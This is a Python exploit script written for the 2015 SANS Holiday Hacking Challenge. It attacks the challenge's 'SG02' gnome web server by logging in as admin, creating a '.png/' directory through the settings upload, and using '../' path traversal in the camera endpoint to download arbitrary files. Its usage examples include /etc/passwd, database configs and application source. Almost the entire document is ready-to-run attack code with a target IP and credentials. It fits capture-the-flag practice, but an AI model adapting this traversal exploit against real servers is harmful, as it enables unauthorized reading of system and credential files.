#!/usr/bin/python
#
# Exploit Title: SANS Holiday Hacking Challenge GIYH SG02 LFI Exploit
# Date: 12/2015
# Exploit Author: @deckerXL
# Version: 1.1
# Tested on: sg02
# Description: This will perform the path traversal LFI attack on the Settings upload & cam functionality achieving arbitrary file download for files that user gnome-admin can read

import sys
import json
import urllib
import urllib2

debug           = False
pathstartmarker = '<p class="message">Dir '
pathendmarker   = ' created successfully!'

class NoRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        infourl = urllib.addinfourl(fp, headers, req.get_full_url())
        infourl.status = code
        infourl.code = code
        return infourl
    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

opener = urllib2.build_opener(NoRedirectHandler())
urllib2.install_opener(opener)

def usage():
	print "Usage:"
	print "./giyh-sg02-LFI-pwn.py <ip> <port> <command> <user> <password> <full_path_to_file> [-d]\n"
	print "<command>"
	print "  D = Download file from Files section"
	print "     <user>     = User to login with"
	print "     <password> = Password to login with"
	print "     <filename> = full path from / to file to download"
	print "Examples:"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/gnome.conf"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/20150225093040.zip"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/factory_cam_2.zip"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/gnome_firmware_rel_notes.txt"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/sgnet.zip"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/files/sniffer_hit_list.txt"
	print ""
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /etc/passwd"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /etc/mongod.conf"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/app.js"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /gnome/www/routes/index.js"
	print "./giyh-sg02-LFI-pwn.py 52.34.3.80 80 D admin SittingOnAShelf /var/log/mongodb/mongod.log"
	sys.exit(1)

def pmsg( str, code ):
        if ( code == 0 ):
                print "        [*] "+str      # Status message
        elif ( code == 1):
                print "        [+] "+str      # Success message
        elif ( code == 2):
                print "        [-] "+str      # Error message
        else:
                pass

def banner():
        print ""
        print "       =[ ----------------------------------------------- ]"
        print "+ -- --=[ GIYH SG02 LFI Exploit                           ]"
        print "       =[                                     by deckerXL ]"
        print "       =[ ----------------------------------------------- ]"
        print "                                                    __     "
        print "                                                 .-'  |    "
        print "                                                /   <\|    "
        print "                                               /     \'    "
        print "                                               |_.- o-o    "
        print "                                               / C  -._)\  "
        print "          ________.________.___. ___ ___      /',        | "
        print "         /  _____/|   \__  |   |/   |   \    |   `-,_,__,' "
        print "        /   \  ___|   |/   |   /    ~    \   (,,)====[_]=| "
        print "        \    \_\  \   |\____   \    Y    /     '.   ____/  "
        print "         \______  /___|/ ______|\___|_  /       | -|-|_    "
        print "                \/     \/             \/        |____)_)   "
        print ""

# =============================================================
# Check input parameters
# =============================================================
if (len(sys.argv)< 7):
	usage()

ip = sys.argv[1][0:15]
try:
	port = int(sys.argv[2][0:5])
except:
	pmsg ("ERROR - Invalid Port: ["+sys.argv[2]+"]",2)
	usage()

command = sys.argv[3][0:1]
user = sys.argv[4][0:25]
passw = sys.argv[5][0:50]
file = sys.argv[6][0:100]

if (command == "D"):
	banner()
	pmsg ("Attempting to download file ["+file+"]...",1)
else:
	pmsg ("ERROR - Invalid Command: ["+sys.argv[3]+"]",2)
	usage()

if ("-d" in sys.argv):
	debug = True

url = "http://"+ip+":"+str(port)+"/"

values = { 'username': user,'password': passw }
data = urllib.urlencode(values) 

# =============================================================
# Initial GET Request to get a valid sessionid
# =============================================================
pmsg ("Retrieving an initial valid sessionid from URL ["+url+"]...",0)
try:
        req_init = urllib2.Request(url)
        req_init.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
        res_init = urllib2.urlopen(req_init)
except:
        pmsg ("ERROR - Connecting to URL: ["+url+"]",2)
        sys.exit(1)

init_headers = res_init.info()
init_body = res_init.read()

if (debug):
        print "Init Headers & Body ------------------------------------------------------------"
        print init_headers
        print "--------------------------------------------------------------------------------"
        print "["+init_body+"]"
        print "--------------------------------------------------------------------------------"

sessionid = str(filter(lambda x: 'sessionid' in x, init_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an initial valid sessionid: ["+sessionid+"]!",1)
res_init.close()

# =============================================================
# GET Admin sessionid
# =============================================================
req_admin = urllib2.Request(url)
req_admin.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_admin.add_header('Content-Type', 'application/x-www-form-urlencoded')
req_admin.add_header('Cookie', 'sessionid='+sessionid)
res_admin = urllib2.urlopen(req_admin, data)
admin_headers = res_admin.info()
admin_body = res_admin.read()

if (debug):
        print "Admin Headers & Body -----------------------------------------------------------"
        print admin_headers
        print "--------------------------------------------------------------------------------"
        print "["+admin_body+"]"
        print "--------------------------------------------------------------------------------"

admin_sessionid = str(filter(lambda x: 'sessionid' in x, admin_headers.headers)[0]).split(' ')[1].split('=')[1].split(';')[0]
pmsg ("Got an ADMIN valid sessionid: ["+admin_sessionid+"]!",1)
res_admin.close()

# =============================================================
# Create .png directory using Settings file upload feature
# =============================================================
values_settings = { 'filen': '.png/','file': 'doesnotmatter.png' }
data_settings = urllib.urlencode(values_settings) 
settingsfilesurl = url + "settings"
pmsg ("Opening URL: ["+settingsfilesurl+"]",0)

req_settings = urllib2.Request(settingsfilesurl)
req_settings.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_settings.add_header('Content-Type', 'application/x-www-form-urlencoded')
req_settings.add_header('Cookie', 'sessionid='+admin_sessionid)
res_settings = urllib2.urlopen(req_settings, data_settings)
settings_headers = res_settings.info()
settings_body = res_settings.read()

if (debug):
        print "Settings Headers & Body -----------------------------------------------------------"
        print settings_headers
        print "--------------------------------------------------------------------------------"
        print "["+settings_body+"]"
        print "--------------------------------------------------------------------------------"

res_settings.close()

# =============================================================
# Extract the created path
# =============================================================
pathstart = 0
pathstart = settings_body.find(pathstartmarker)
pathend = settings_body.find(pathendmarker)
if (pathstart > 0 and pathend > 0):
	pathstart = pathstart + len(pathstartmarker)
	path = settings_body[pathstart:pathend]
	pmsg ("Path was created successfully ["+path+"]",1)
	rpathstart = path.find('/upload')
	relative_path = path[rpathstart:]
	pmsg ("Relative Path Extracted ["+relative_path+"]",0)
	relative_path_to_root = '..'+relative_path+'../../../../../../'
	pmsg ("Relative Path To The Root Of The Filesystem ["+relative_path_to_root+"]",0)
else:
	pmsg ("ERROR - Failed to find path success message",2)
	sys.exit(1)
	
# =============================================================
# Download the file requested via LFI
# =============================================================
attempt_file_download = relative_path_to_root+file
attempt_file_download = attempt_file_download.replace("//","/")
pmsg ("Attempting to download this file from the relative path achieved: ["+attempt_file_download+"]",0)
cameraurl = url + "cam?camera="+attempt_file_download
pmsg ("Opening URL: ["+cameraurl+"]",0)

req_cam = urllib2.Request(cameraurl)
req_cam.add_header('User-agent', 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0')
req_cam.add_header('Cookie', 'sessionid='+admin_sessionid)
res_cam = urllib2.urlopen(req_cam)
cam_headers = res_cam.info()
cam_body = res_cam.read()

if (debug):
        print "Cam Headers & Body -----------------------------------------------------------"
        print cam_headers
        print "--------------------------------------------------------------------------------"
        print "["+cam_body+"]"
        print "--------------------------------------------------------------------------------"

res_cam.close()

# =============================================================
# Write each file
# =============================================================
writefile = file.split('/')[-1]
pmsg ("Saving ["+writefile+"]...",1)
f = open(writefile, 'w')
f.write(cam_body)
f.close()

pmsg ("Done!",0)
sys.exit(0)
